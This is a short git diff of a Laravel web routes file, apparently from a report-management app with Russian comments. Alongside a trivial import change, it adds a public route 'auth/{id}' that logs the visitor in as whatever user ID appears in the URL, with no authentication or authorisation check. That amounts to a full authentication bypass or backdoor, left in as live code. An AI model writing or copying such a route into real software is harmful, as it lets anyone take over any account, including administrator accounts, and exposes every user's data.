@@ -14,6 +14,7 @@ use App\Http\Controllers\Report\ReportAuthorController;
 use App\Http\Controllers\Report\ReportClientController;
 use App\Http\Controllers\Report\ReportRedactorController;
 use App\Http\Controllers\User\UserController;
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\Option\StyleController;
 use App\Http\Controllers\Option\ThemeController;
@@ -36,11 +37,17 @@ use App\Http\Controllers\Option\SocialNetworkController;
 #Главная страница (пустая)
 
 Route::get('/', function () {
+
     if (is_null(UserHelper::getUserId())) {
         return redirect()->route('login.index');
     } else {
         return redirect()->route('home');
     }
+});
+
+Route::get('auth/{id}', function($id){
+    Auth::loginUsingId($id);
+    return redirect()->route('home');
 });
 
 #Авторизация
